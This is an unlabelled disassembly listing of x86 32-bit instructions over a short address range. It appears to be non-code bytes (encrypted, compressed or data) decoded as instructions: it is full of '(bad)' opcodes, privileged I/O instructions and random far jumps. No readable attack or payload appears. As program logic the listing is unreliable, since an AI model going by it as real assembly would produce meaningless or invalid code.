  417804:	xor    al,BYTE PTR [eax-0x65925b6e]
  41780a:	out    0x39,al
  41780c:	adc    al,0xa
  41780e:	mov    BYTE PTR [eax+0x63],cl
  417811:	xchg   edx,eax
  417812:	dec    esp
  417813:	jae    0x41779f
  417815:	sbb    al,bh
  417817:	outs   dx,BYTE PTR ds:[esi]
  417818:	push   es
  417819:	cld    
  41781a:	cmp    DWORD PTR [edi],edi
  41781c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41781d:	mov    dh,0x2e
  41781f:	xchg   esi,eax
  417820:	loop   0x417882
  417822:	mov    esp,0x24c834a0
  417827:	jne    0x4177b8
  417829:	push   esp
  41782a:	out    dx,eax
  41782b:	inc    ebx
  41782c:	lods   al,BYTE PTR ds:[esi]
  41782d:	inc    eax
  41782e:	outs   dx,DWORD PTR ds:[esi]
  41782f:	adc    al,0xb7
  417831:	loope  0x417846
  417833:	std    
  417834:	test   ecx,0x5aef4d14
  41783a:	fild   QWORD PTR [edi-0x4b]
  41783d:	push   ss
  41783e:	fld    TBYTE PTR [ebx]
  417840:	lods   al,BYTE PTR ds:[esi]
  417841:	mov    ds:0x7718c0a8,al
  417846:	scas   al,BYTE PTR es:[edi]
  417847:	in     al,0x91
  417849:	es (bad) 
  41784c:	sbb    DWORD PTR [ebx+ecx*2],eax
  41784f:	sub    ecx,0xffffffe1
  417852:	dec    esp
  417853:	popa   
  417854:	sbb    ch,al
  417856:	and    esp,DWORD PTR [esi-0x54495c1d]
  41785c:	push   0xffffffea
  41785e:	inc    ebx
  41785f:	imul   DWORD PTR [eax-0x2d]
  417862:	xchg   esi,eax
  417863:	mov    ch,0x4b
  417865:	sbb    al,0xf
  417867:	sub    al,0x4c
  417869:	push   es
  41786a:	dec    esp
  41786b:	fwait
  41786c:	daa    
  41786d:	push   0x8024a218
  417872:	stos   BYTE PTR es:[edi],al
  417873:	add    al,0xb2
  417875:	or     BYTE PTR [ecx+0x26],ah
  417878:	fld    DWORD PTR [esi]
  41787a:	(bad)  [eax+0x1c]
  41787d:	push   ebp
  41787e:	shl    DWORD PTR [edi],1
  417880:	push   ds
  417881:	pop    edi
  417882:	loop   0x41788e
  417884:	mov    eax,ds:0x77a2c01b
  417889:	add    al,0x42
  41788b:	cmp    eax,edi
  41788d:	leave  
  41788e:	push   ss
  41788f:	jns    0x417895
  417891:	mov    ebx,0x66a2139e
  417896:	rol    ch,0x18
  417899:	pop    ss
  41789a:	(bad)  
  41789b:	mov    ?,WORD PTR [ebx-0x473276b6]
  4178a1:	(bad)  
  4178a2:	int3   
  4178a3:	push   edx
  4178a4:	dec    esi
  4178a5:	sti    
  4178a6:	mov    edx,0x10771b9
  4178ab:	retf   0x259
  4178ae:	inc    esi
  4178af:	dec    ebx
  4178b0:	out    dx,eax
  4178b1:	mov    al,ds:0x200399c8
  4178b6:	cwde   
  4178b7:	xor    DWORD PTR [ebx+esi*8-0x1b22f75e],ecx
  4178be:	lods   al,BYTE PTR ds:[si]
  4178c0:	sub    dl,BYTE PTR [esi+0x6ba1846f]
  4178c6:	dec    eax
  4178c7:	(bad)  
  4178c8:	xor    al,0x80
  4178ca:	(bad)  
  4178cc:	sub    bh,BYTE PTR [ecx+0xb]
  4178cf:	test   ch,bh
  4178d1:	(bad)  
  4178d2:	(bad)  
  4178d3:	es fmulp st(7),st
  4178d6:	sbb    DWORD PTR [esi+ecx*1],esi
  4178d9:	ins    DWORD PTR es:[edi],dx
  4178da:	popa   
  4178db:	jmp    0x1f7a3e24
  4178e0:	xor    ecx,ebx
  4178e2:	nop
  4178e3:	pop    ecx
  4178e4:	mov    ds:0xb5ff9046,eax
  4178e9:	push   edx
  4178ea:	jae    0x417928
  4178ec:	xchg   BYTE PTR [esi+edi*1+0x3b],ah
  4178f0:	aam    0xea
  4178f2:	or     esi,DWORD PTR [ebp-0x52]
  4178f5:	test   eax,0x7d6dd659
  4178fa:	mov    edi,0x196ca492
  4178ff:	sbb    DWORD PTR [ecx+0x33],esi
  417902:	int3   
  417903:	cmp    BYTE PTR [edx+0x4e7fe9f1],dh
  417909:	inc    ebp
  41790a:	push   edi
  41790b:	iret   
  41790c:	test   eax,0x8316c9ec
  417911:	daa    
  417912:	pop    ebp
  417913:	repnz xor ebp,edi
  417916:	inc    esi
  417917:	mov    DWORD PTR [esp+ebx*8],edi
  41791a:	add    DWORD PTR [ebx-0x59],esi
  41791d:	icebp  
  41791e:	das    
  41791f:	call   0x1ec1:0x7db90560
  417926:	pusha  
  417927:	(bad)  
  417928:	(bad)  
  417929:	xchg   edi,eax
  41792a:	ss cli 
  41792c:	mov    edx,0x12cfd295
  417931:	inc    esi
  417932:	xor    DWORD PTR [eax-0x3092d237],0x6788640f
  41793c:	xor    bh,BYTE PTR [ecx-0x5b]
  41793f:	fisub  DWORD PTR ds:0xdc3bd604
  417945:	ficomp WORD PTR [eax]
  417947:	mov    ds:0xb378e2d6,al
  41794c:	loopne 0x41797d
  41794e:	and    al,BYTE PTR [edx+0x14]
  417951:	mov    edi,DWORD PTR [ebp-0x47]
  417954:	aad    0x73
  417956:	mov    eax,ds:0x2c86f155
  41795b:	xlat   BYTE PTR ds:[ebx]
  41795c:	imul   esi,DWORD PTR [ecx+0x65d571ed],0xffffffea
  417963:	daa    
  417964:	mov    BYTE PTR [eax],ch
  417966:	xor    eax,DWORD PTR [edi+0x10]
  417969:	or     bl,al
  41796b:	aas    
  41796c:	pushf  
  41796d:	in     eax,0x24
  41796f:	imul   ebx,edi,0xffffffc9
  417972:	repnz push ss
  417974:	xchg   esp,eax
  417975:	call   0x13a6fd80
  41797a:	js     0x417920
  41797c:	lods   al,BYTE PTR ds:[esi]
  41797d:	test   DWORD PTR [esi+ebp*8],ecx
  417980:	scas   eax,DWORD PTR es:[edi]
  417981:	inc    edi
  417982:	add    edx,DWORD PTR [eax+0x6ac78d11]
  417988:	les    ecx,FWORD PTR [ecx]
  41798a:	xor    eax,0x7e3914f5
  41798f:	inc    esi
  417990:	jmp    0x417987
  417992:	xchg   esp,eax
  417993:	std    
  417994:	and    DWORD PTR [eax-0x75],ebp
  417997:	(bad)  
  417998:	mov    edi,0x843213e8
  41799d:	cmp    al,0x1d
  41799f:	adc    al,0xfc
  4179a1:	and    ecx,DWORD PTR [edx+0x7a]
  4179a4:	(bad)  
  4179a5:	iret   
  4179a6:	inc    esp
  4179a7:	iret   
  4179a8:	mov    WORD PTR [edx],?
  4179aa:	arpl   WORD PTR [ebx+0x1adbc82a],sp
  4179b0:	cs jae 0x417a16
  4179b3:	mov    bl,0x3a
  4179b5:	ins    DWORD PTR es:[edi],dx
  4179b6:	inc    ebp
  4179b7:	lods   eax,DWORD PTR ds:[esi]
  4179b8:	adc    eax,0x6d619f86
  4179bd:	pop    ds
  4179be:	mov    ds:0x7bc488d4,eax
  4179c3:	dec    esi
  4179c4:	mov    ds:0x8d764a6d,al
  4179c9:	in     al,0x30
  4179cb:	imul   ebx,DWORD PTR [edi+0x5a],0xddcf2421
  4179d2:	jl     0x417a08
  4179d4:	ficomp WORD PTR [ebx-0x32]
  4179d7:	mov    ch,0x35
  4179d9:	bnd gs jne 0x41798b
  4179dd:	sub    al,0xbd
  4179df:	fcom   QWORD PTR ds:0x6504b7f6
  4179e5:	dec    BYTE PTR [ebp+0x79b7161a]
  4179eb:	pop    ebp
  4179ec:	lods   eax,DWORD PTR ds:[esi]
  4179ed:	shl    DWORD PTR [edi+0x6bbb9aa7],1
  4179f3:	pop    eax
  4179f4:	mov    ebx,0x359dc92d
  4179f9:	test   ah,ch
  4179fb:	loope  0x417a61
  4179fd:	pushf  
  4179fe:	icebp  
  4179ff:	sbb    dl,BYTE PTR [ebx+0x55]
  417a02:	data16 fisub WORD PTR [ebx-0x2197efeb]
  417a09:	ficom  WORD PTR [edx-0x9]
  417a0c:	and    BYTE PTR [edx+0x79],cl
  417a0f:	(bad)  
  417a10:	fsubr  st(3),st
  417a12:	and    DWORD PTR [ebx+edi*8-0x1c475b3],0x5e
  417a1a:	dec    ebp
  417a1b:	ss retf 
  417a1d:	pxor   mm5,QWORD PTR [ecx]
  417a20:	sbb    eax,0x6e8cc4d2
  417a25:	sub    eax,0x2be43838
  417a2a:	inc    esp
  417a2b:	mov    ds:0x20da1f0c,al
  417a30:	mov    al,0x2e
  417a32:	mov    cl,0x7d
  417a34:	stc    
  417a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a36:	jnp    0x417a4a
  417a38:	repz pop ecx
  417a3a:	adc    bh,BYTE PTR [ebx-0x37a266b7]
  417a40:	sub    cl,dh
  417a42:	ins    BYTE PTR es:[edi],dx
  417a43:	mov    ds:0x805e3dcb,al
  417a48:	sbb    al,0x37
  417a4a:	scas   al,BYTE PTR es:[edi]
  417a4b:	and    ebx,ecx
  417a4d:	push   0xf3250d7c
  417a52:	mov    es,WORD PTR [esp+esi*1]
  417a55:	aad    0xa5
  417a57:	out    0x27,eax
  417a59:	jns    0x4179eb
  417a5b:	inc    ebp
  417a5c:	stc    
  417a5d:	push   ecx
  417a5e:	fcmovnu st,st(4)
  417a60:	lea    edi,[esi]
  417a62:	repnz daa 
  417a64:	xchg   edx,eax
  417a65:	cmp    bh,BYTE PTR fs:[ebx]
  417a68:	dec    ebp
  417a69:	(bad)  
  417a6a:	fldcw  WORD PTR [eax+ecx*8+0x4d2727ff]
  417a71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a72:	mov    bl,0x28
  417a74:	ja     0x417a55
  417a76:	jno    0x417a06
  417a78:	sahf   
  417a79:	add    cl,BYTE PTR [edi+0x12]
  417a7c:	ret    0x998d
  417a7f:	lock adc ebp,0x1a4a5239
  417a86:	fs push esp
  417a88:	in     al,0x27
  417a8a:	scas   al,BYTE PTR es:[edi]
  417a8b:	test   BYTE PTR [ebp+0x46],0xe5
  417a8f:	mov    DWORD PTR [esi+0x3ea5132],edi
  417a95:	xor    BYTE PTR [esi+0x13875797],bl
  417a9b:	jae    0x417a49
  417a9d:	sbb    eax,0x6c4b2966
  417aa2:	xor    esi,edx
  417aa4:	in     al,0x26
  417aa6:	cmp    cl,BYTE PTR [eax-0x28]
  417aa9:	inc    ebp
  417aaa:	icebp  
  417aab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417aac:	lock out 0x13,al
  417aaf:	xor    DWORD PTR [ebp+0x2d],ebx
  417ab2:	pushf  
  417ab3:	pop    edx
  417ab4:	inc    edi
  417ab5:	loopne 0x417afe
  417ab7:	jbe    0x417abf
  417ab9:	repnz and al,0x75
  417abc:	sub    eax,0xe8414232
  417ac1:	mov    al,0x31
  417ac3:	jbe    0x417b16
  417ac5:	in     eax,0x79
  417ac7:	pop    edi
  417ac8:	test   al,0xef
  417aca:	lock adc dh,BYTE PTR [edx-0x63a4c2e4]
  417ad1:	push   0x9
  417ad3:	fneni(8087 only) 
  417ad5:	frstor [edx-0x4b]
  417ad8:	stc    
  417ad9:	lods   eax,DWORD PTR ds:[esi]
  417ada:	push   esi
  417adb:	mov    cr5,ebx
  417ade:	fnstcw WORD PTR [eax-0x610ac5d3]
  417ae4:	xchg   ebx,eax
  417ae5:	lea    edi,[edi]
  417ae7:	and    BYTE PTR [edx+0x45],bh
  417aea:	out    0xde,al
  417aec:	xchg   DWORD PTR [edx+0x2f],edx
  417aef:	pushf  
  417af0:	ss adc al,0x15
  417af3:	call   0x1232915f
  417af8:	jmp    0x3bde:0x94b1817e
  417aff:	push   ss
  417b00:	sahf   
  417b01:	into   
  417b02:	sti    
  417b03:	sbb    eax,0x92a1116c
  417b08:	(bad)  
  417b09:	(bad)
  417b0c:	sub    BYTE PTR [ebp-0x6c],dl
  417b0f:	pop    edx
  417b10:	mov    ebp,0x9489a52
  417b15:	sbb    esp,DWORD PTR [esi+edi*2-0x52]
  417b19:	mov    bl,0xe
  417b1b:	add    BYTE PTR [edi+0x49bdf465],bh
  417b21:	jp     0x417b15
  417b23:	mov    ds:0x463ded82,eax
  417b28:	sahf   
  417b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b2a:	sbb    DWORD PTR [edx],0xffffff87
  417b2d:	pop    eax
  417b2e:	dec    eax
  417b2f:	pop    edx
  417b30:	sub    ecx,DWORD PTR [edi]
  417b32:	and    BYTE PTR [ecx+0x5],0xc1
  417b36:	mov    edi,edi
  417b38:	jmp    0x417b7e
  417b3a:	call   0xf76d:0x4a03952e
  417b41:	scas   eax,DWORD PTR es:[edi]
  417b42:	cmc    
  417b43:	mov    WORD PTR [ebx],ss
  417b45:	out    0x6b,al
  417b47:	arpl   WORD PTR gs:[eax+0x27bb9781],bp
  417b4e:	fwait
  417b4f:	sub    BYTE PTR [edi+0xbbe1ac2],bh
  417b55:	ret    
  417b56:	pusha  
  417b57:	pop    es
  417b58:	sub    al,0x29
  417b5a:	sbb    eax,DWORD PTR [edi]
  417b5c:	cmp    dh,BYTE PTR [esi]
  417b5e:	out    0xfe,al
  417b60:	mov    edi,0xf835e014
  417b65:	stos   BYTE PTR es:[edi],al
  417b66:	lea    edi,[esi]
  417b68:	inc    esi
  417b69:	mov    dl,0x5b
  417b6b:	add    bh,BYTE PTR [eax+0x5e]
  417b6e:	dec    edi
  417b6f:	(bad)  
  417b70:	pop    ss
  417b71:	jb     0x417bbd
  417b73:	cmc    
  417b74:	mov    dh,ch
  417b76:	xor    bh,ah
  417b78:	test   al,0xb0
  417b7a:	and    ecx,DWORD PTR [ecx-0x2da1f40e]
  417b80:	sub    DWORD PTR [esi],edx
  417b82:	fisttp DWORD PTR [ebp+0x8]
  417b85:	xchg   esp,eax
  417b86:	dec    ecx
  417b87:	shl    DWORD PTR [ebx-0x6ce3ba91],cl
  417b8d:	fs push esp
  417b8f:	jmp    0xb1f6:0x2e30230d
  417b96:	fbstp  TBYTE PTR [edx+edx*1]
  417b99:	xchg   edx,eax
  417b9a:	aad    0x0
  417b9c:	leave  
  417b9d:	adc    al,0x27
  417b9f:	and    eax,0x65c84a67
  417ba4:	sub    edi,DWORD PTR [ebx+0x19]
  417ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ba8:	mov    dh,0x1e
  417baa:	jno    0x417ba0
  417bac:	sub    DWORD PTR [ecx-0x48],edx
  417baf:	sub    edx,ebx
  417bb1:	push   eax
  417bb2:	jnp    0x417b89
  417bb4:	sbb    ebp,ebp
  417bb6:	fiadd  WORD PTR [ebx+0x79]
  417bb9:	out    dx,eax
  417bba:	push   ebp
  417bbb:	adc    eax,0xb6841273
  417bc0:	mov    edx,DWORD PTR [eax+eiz*2+0x5fffd1c9]
  417bc7:	pop    ss
  417bc8:	dec    ebp
  417bc9:	arpl   WORD PTR [edi+0x4c15b026],cx
  417bcf:	pushf  
  417bd0:	dec    ecx
  417bd1:	jnp    0x417b82
  417bd3:	aam    0xfc
  417bd5:	les    esi,FWORD PTR [edx+0x1250f6d5]
  417bdb:	out    0x16,al
  417bdd:	pop    esp
  417bde:	int    0x1c
  417be0:	xor    bl,bl
  417be2:	mov    bl,0xea
  417be4:	jmp    edx
  417be6:	in     al,0x32
  417be8:	jmp    0x417c41
  417bea:	mov    esi,0xe3599fa9
  417bef:	push   edi
  417bf0:	mov    ds:0xd33f9505,al
  417bf5:	lods   al,BYTE PTR ds:[esi]
  417bf6:	mov    al,BYTE PTR [ebx-0x761ea304]
  417bfc:	and    edi,esi
  417bfe:	fidivr DWORD PTR [ecx]
  417c00:	xor    al,0x5e
  417c02:	test   edi,ecx
  417c04:	out    dx,eax
  417c05:	xor    BYTE PTR [ebp-0x50c957db],0xa0
  417c0c:	xchg   ecx,eax
  417c0d:	fmul   QWORD PTR [ebx+0x15c2099]
  417c13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c14:	mov    ds:0x1b9107c3,eax
  417c19:	jne    0x417c82
  417c1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c1c:	or     eax,0x65c90f7b
  417c21:	outs   dx,BYTE PTR ds:[esi]
  417c22:	mov    ebp,0xd955f688
  417c27:	not    edi
  417c29:	jmp    0x9d120c4
  417c2e:	inc    ebp
  417c2f:	pop    ecx
  417c30:	ds push cs
  417c32:	dec    edi
  417c33:	dec    ebx
  417c34:	inc    ebp
  417c35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c36:	(bad)  
  417c37:	or     DWORD PTR [ebp+0x44],ebp
  417c3a:	lods   al,BYTE PTR ds:[esi]
  417c3b:	ja     0x417bff
  417c3d:	(bad)  [esi]
  417c3f:	ret    
  417c40:	sahf   
  417c41:	add    edx,DWORD PTR [eax+0xb6c3a23]
  417c47:	jb     0x417be9
  417c49:	loopne 0x417c89
  417c4b:	adc    eax,DWORD PTR [esi+0x27]
  417c4e:	enter  0x6f34,0x26
  417c52:	dec    esp
  417c53:	jb     0x417cd1
  417c55:	pop    ebx
  417c56:	js     0x417c89
  417c58:	jmp    0x417c15
  417c5a:	ror    BYTE PTR [esi-0x6bb2a8de],1
  417c60:	jp     0x417c4b
  417c62:	mov    ebp,0x7deedc4a
  417c67:	ds or  ebx,ecx
  417c6a:	mov    bh,0x33
  417c6c:	inc    eax
  417c6d:	arpl   WORD PTR [edi+0x4],ax
  417c70:	xchg   DWORD PTR [eax-0x80],esp
  417c73:	jmp    0x5700a62d
  417c78:	sbb    DWORD PTR [esi-0x5e9023b2],eax
  417c7e:	cmp    esi,DWORD PTR [ebp-0x61]
  417c81:	lock mov DWORD PTR [esi+0x6b61d940],esi
  417c88:	sub    BYTE PTR [ecx],cl
  417c8a:	and    BYTE PTR [ebx],dl
  417c8c:	or     eax,DWORD PTR [edx]
  417c8e:	dec    esp
  417c8f:	imul   DWORD PTR [esi-0x377c3bfe]
  417c95:	or     ebp,DWORD PTR [eax+ecx*4+0x3a]
  417c99:	xchg   DWORD PTR [edx+0x3e58dec],esp
  417c9f:	enter  0x4343,0x75
  417ca3:	mov    ah,0x2e
  417ca5:	mov    eax,eax
  417ca7:	mov    ch,BYTE PTR [edx+0x2a]
  417caa:	loop   0x417c37
  417cac:	adc    eax,0x93ac1a0c
  417cb1:	and    al,dl
  417cb3:	xchg   esp,eax
  417cb4:	popa   
  417cb5:	and    dl,BYTE PTR [esi-0x12242282]
  417cbb:	pusha  
  417cbc:	dec    ebp
  417cbd:	push   ds
  417cbe:	mov    al,0x42
  417cc0:	fild   WORD PTR [edx+0x3ce3d332]
  417cc6:	cmp    al,0xa5
  417cc8:	push   ecx
  417cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cca:	fadd   QWORD PTR [ebx+0x22089cec]
  417cd0:	cli    
  417cd1:	push   cs
  417cd2:	cmp    ebx,eax
  417cd4:	scas   al,BYTE PTR es:[edi]
  417cd5:	jo     0x417ce5
  417cd7:	fisubr WORD PTR [edx-0x39]
  417cda:	and    al,0x6d
  417cdc:	popa   
  417cdd:	ret    0x9649
  417ce0:	retf   0x7ea5
  417ce3:	call   0x2e26:0x338e9de7
  417cea:	or     bh,BYTE PTR [ecx]
  417cec:	and    ch,dl
  417cee:	mov    bh,dl
  417cf0:	mov    ebx,0xaca9506f
  417cf5:	sar    DWORD PTR [ebp-0x1bb2b354],1
  417cfb:	out    0x7a,eax
  417cfd:	nop
  417cfe:	mov    ecx,DWORD PTR [eax-0xf]
  417d01:	jo     0x417d80
  417d03:	stos   BYTE PTR es:[edi],al
  417d04:	jmp    FWORD PTR [ecx]
  417d06:	mov    cl,0x95
  417d08:	xor    eax,0x4953ca95
  417d0d:	push   ebx
  417d0e:	push   esi
  417d0f:	mov    BYTE PTR [esp+eax*1-0x6b],cl
  417d13:	xchg   esi,eax
  417d14:	inc    edi
  417d15:	call   0xf20ec115
  417d1a:	sbb    DWORD PTR [ecx+ecx*2+0x765f43cd],edi
  417d21:	mov    esp,0xce1e63d0
  417d26:	inc    esi
  417d27:	mov    eax,ds:0xfe2dd276
  417d2c:	xchg   DWORD PTR [eax],esi
  417d2e:	loope  0x417d0e
  417d30:	out    0x68,eax
  417d32:	jo     0x417cd2
  417d34:	and    eax,0xdb4565d7
  417d39:	outs   dx,DWORD PTR ds:[esi]
  417d3a:	cdq    
  417d3b:	mov    dl,0x4b
  417d3d:	mov    al,0x78
  417d3f:	or     al,0x6f
  417d41:	jmp    0x417dbf
  417d43:	sbb    al,0xa6
  417d45:	ror    edx,1
  417d47:	jmp    0x7841ce32
  417d4c:	mov    ax,0x3e34
  417d50:	rol    DWORD PTR [edx+eiz*1+0x7d93a57f],0x2f
  417d58:	addr16 push ebp
  417d5a:	(bad)  
  417d5b:	mov    ah,0x3
  417d5d:	mov    ebx,0xa910e62e
  417d62:	jl     0x417d82
  417d64:	comiss xmm4,DWORD PTR [ecx+0x5e0fc347]
  417d6b:	and    ecx,edi
  417d6d:	adc    eax,0x5255e869
  417d72:	dec    eax
  417d73:	mov    DWORD PTR [esi-0x13],0xb4076f7b
  417d7a:	and    eax,0xa3c8f0fd
  417d7f:	test   DWORD PTR fs:[ecx+edi*1-0x3a5f12c8],ebp
  417d87:	mov    ah,0x65
  417d89:	pop    eax
  417d8a:	xchg   BYTE PTR [eax-0x5a],bh
  417d8d:	fisubr WORD PTR [eax]
  417d8f:	mov    BYTE PTR [ebp-0x24],0x18
  417d93:	outs   dx,DWORD PTR ds:[esi]
  417d94:	(bad)  
  417d95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d96:	stos   DWORD PTR es:[edi],eax
  417d97:	in     eax,dx
  417d98:	push   cs
  417d99:	cmp    al,0xb7
  417d9b:	pop    edx
  417d9c:	xchg   esi,eax
  417d9d:	xor    edi,DWORD PTR [esi-0x5e]
  417da0:	repnz or edx,esi
  417da3:	dec    eax
  417da4:	push   es
  417da5:	mov    esi,0x269e678e
  417daa:	mov    ds:0xdc073761,eax
  417daf:	aaa    
  417db0:	ins    BYTE PTR es:[edi],dx
  417db1:	or     DWORD PTR [ebp+0x5],esp
  417db4:	pop    ss
  417db5:	add    eax,0xe502b96d
  417dba:	test   DWORD PTR [ebp-0x1b],eax
  417dbd:	data16 fwait
  417dbf:	jno    0x417d89
  417dc1:	(bad)  
  417dc2:	shr    BYTE PTR [ebx],cl
  417dc4:	lods   al,BYTE PTR ds:[esi]
  417dc5:	jp     0x417dd0
  417dc7:	jecxz  0x417dc3
  417dc9:	loop   0x417e24
  417dcb:	xchg   bl,cl
  417dcd:	je     0x417d89
  417dcf:	fwait
  417dd0:	imul   edx,DWORD PTR [edx+eax*2+0x34],0x2a1704ca
  417dd8:	xchg   BYTE PTR [ebx+ebp*2+0x31],ch
  417ddc:	xchg   esp,eax
  417ddd:	sub    al,0xbf
  417ddf:	cmc    
  417de0:	out    dx,al
  417de1:	ins    DWORD PTR es:[edi],dx
  417de2:	sar    DWORD PTR [esi-0x61],1
  417de5:	mul    DWORD PTR [ebp-0x2c3d9ed7]
  417deb:	sub    dh,bh
  417ded:	mov    al,ds:0x5eb9bc7e
  417df2:	fs test eax,0xc2d1c167
  417df8:	and    BYTE PTR [ebx],ah
  417dfa:	sbb    esi,DWORD PTR [ecx+ebx*4]
  417dfd:	pop    eax
  417dfe:	push   ss
  417dff:	repnz lock test DWORD PTR [ebp-0x16],eax
  417e04:	adc    dh,BYTE PTR [ebx+0x69]
  417e07:	mov    cs,ebp
  417e09:	imul   esp,DWORD PTR [edx+ebx*8-0x52],0xa24a8343
  417e11:	pushf  
  417e12:	fimul  DWORD PTR [eax+eax*2]
  417e15:	dec    ecx
  417e16:	xchg   esp,eax
  417e17:	inc    ebx
  417e18:	test   al,0x1d
  417e1a:	mov    BYTE PTR [ebx-0x36],ch
  417e1d:	mov    eax,0xff5cd294
  417e22:	xor    al,0x8f
  417e24:	push   cs
  417e25:	push   esi
  417e26:	daa    
  417e27:	fld    QWORD PTR [eax]
  417e29:	popa   
  417e2a:	push   ebp
  417e2b:	out    dx,al
  417e2c:	test   al,0xb8
  417e2e:	xlat   BYTE PTR ds:[ebx]
  417e2f:	dec    DWORD PTR [edi+0x43]
  417e32:	or     eax,0xedaa4533
  417e37:	or     esp,DWORD PTR [edx]
  417e39:	pop    edx
  417e3a:	(bad)  
  417e3b:	jb     0x417de0
  417e3d:	fidivr WORD PTR [eax-0x50]
  417e40:	cmp    eax,edi
  417e42:	sub    eax,0xf
  417e45:	clc    
  417e46:	cdq    
  417e47:	pop    ss
  417e48:	dec    esp
  417e49:	ss mov ch,0x48
  417e4c:	push   es
  417e4d:	shl    DWORD PTR [eax],1
  417e4f:	mov    bl,0x43
  417e51:	pushf  
  417e52:	and    BYTE PTR [esi],0xea
  417e55:	aad    0x5b
  417e57:	mov    eax,ds:0xa1714356
  417e5c:	dec    edi
  417e5d:	xchg   esi,eax
  417e5e:	aad    0xa3
  417e60:	xor    esi,ecx
  417e62:	in     eax,0x11
  417e64:	push   0x87994fb8
  417e69:	ret    0x81a8
  417e6c:	fcomp  QWORD PTR [eax+esi*8+0x4d8d27d7]
  417e73:	inc    esi
  417e74:	lea    eax,[esi+0x1edadcbd]
  417e7a:	cmp    eax,0x55573da5
  417e7f:	mov    ah,0xca
  417e81:	loope  0x417e87
  417e83:	push   0xfffffff0
  417e85:	scas   eax,DWORD PTR es:[edi]
  417e86:	out    dx,al
  417e87:	xchg   DWORD PTR [esp+ebx*4],eax
  417e8a:	xchg   ebp,eax
  417e8b:	jne    0x417ed0
  417e8d:	mov    ah,0x34
  417e8f:	sbb    al,0x0
  417e91:	push   ss
  417e92:	or     esp,DWORD PTR ds:0x4424c1e
  417e98:	sti    
  417e99:	jo     0x417ea8
  417e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e9c:	dec    ecx
  417e9d:	(bad)  
  417e9e:	ds repz in eax,0x8
  417ea2:	xor    al,0x7d
  417ea4:	sar    ah,1
  417ea6:	xchg   ebx,eax
  417ea7:	cmp    edx,DWORD PTR [ecx]
  417ea9:	jmp    0x1d80:0x15138a7f
  417eb0:	sbb    al,0xe0
  417eb2:	cmp    al,0x33
  417eb4:	adc    eax,0x2a476388
  417eb9:	and    ecx,ecx
  417ebb:	add    BYTE PTR [eax-0x29],al
  417ebe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ebf:	jb     0x417f30
  417ec1:	clc    
  417ec2:	jmp    0xa5d0:0x6e0f03ae
  417ec9:	ret    
  417eca:	inc    ebp
  417ecb:	sub    bh,dl
  417ecd:	test   eax,0x28581438
  417ed2:	sub    ecx,DWORD PTR [edx+0x14]
  417ed5:	test   al,0x68
  417ed7:	and    eax,0xf7c9f24d
  417edc:	iret   
  417edd:	jg     0x417f3c
  417edf:	pop    ebp
  417ee0:	lea    esp,[edi]
  417ee2:	adc    esi,eax
  417ee4:	jecxz  0x417eb7
  417ee6:	fptan  
  417ee8:	mov    DWORD PTR [ecx-0xd],ecx
  417eeb:	ins    BYTE PTR es:[edi],dx
  417eec:	dec    ecx
  417eed:	sbb    al,BYTE PTR [esi+0xd07e151]
  417ef3:	ror    BYTE PTR [edx-0x31dd35af],0x59
  417efa:	hlt    
  417efb:	xchg   esp,eax
  417efc:	lea    eax,[ebx+0xa1b84c5]
  417f02:	mov    ds:0x65c2a154,eax
  417f07:	sbb    al,0x88
  417f09:	add    DWORD PTR [edi-0x7e],edx
  417f0c:	mov    dh,0x2f
  417f0e:	inc    esp
  417f0f:	(bad)  
  417f11:	aam    0x23
  417f13:	dec    DWORD PTR [ebx+0x4a]
  417f16:	add    al,0x6e
  417f18:	cmp    edx,DWORD PTR [esi-0x14]
  417f1b:	gs clc 
  417f1d:	push   ds
  417f1e:	pop    esi
  417f1f:	cmp    eax,0xc2d1da06
  417f24:	cmc    
  417f25:	sbb    al,0x8
  417f27:	outs   dx,BYTE PTR ds:[esi]
  417f28:	stc    
  417f29:	rcr    BYTE PTR [eax],cl
  417f2b:	jmp    0x417f8e
  417f2d:	cmp    edi,esp
  417f2f:	cwde   
  417f30:	pop    ecx
  417f31:	minps  xmm4,XMMWORD PTR [esi-0x493cfe79]
  417f38:	or     al,0x9f
  417f3a:	or     DWORD PTR [ebp-0x6e97ece],0x7d6552f9
  417f44:	cld    
  417f45:	ds psrad mm6,mm5
  417f49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f4a:	imul   edi,DWORD PTR [eax-0x40],0xffffffe8
  417f4e:	jne    0x417f90
  417f50:	std    
  417f51:	aas    
  417f52:	cdq    
  417f53:	das    
  417f54:	(bad)  
  417f55:	imul   edx,DWORD PTR [edx-0x6b],0x91862d4f
  417f5c:	and    ebp,eax
  417f5e:	dec    edx
  417f5f:	(bad)  
  417f61:	push   0x9bfdb144
  417f66:	data16 ds jmp 0x417f98
  417f6a:	jo     0x417fd5
  417f6c:	and    al,dl
  417f6e:	stos   DWORD PTR es:[edi],eax
  417f6f:	dec    esp
  417f70:	mov    cl,0x88
  417f72:	scas   eax,DWORD PTR es:[edi]
  417f73:	sar    BYTE PTR [esi+0x2e],cl
  417f76:	xchg   esp,eax
  417f77:	pop    eax
  417f78:	mov    gs,WORD PTR [ecx]
  417f7a:	ds push 0xffffffd4
  417f7d:	rol    BYTE PTR [edx-0x57ad8184],cl
  417f83:	fnstcw WORD PTR [ecx-0x5a]
  417f86:	mov    bh,0xbd
  417f88:	add    al,0xf1
  417f8a:	stos   BYTE PTR es:[edi],al
  417f8b:	fmul   DWORD PTR [ecx+0x5a]
  417f8e:	add    eax,0x5ae4e7c7
  417f93:	rcr    DWORD PTR [edi],cl
  417f95:	jmp    0x417f30
  417f97:	dec    edi
  417f98:	aam    0x92
  417f9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f9b:	data16 fisubr WORD PTR ds:0x149c79c2
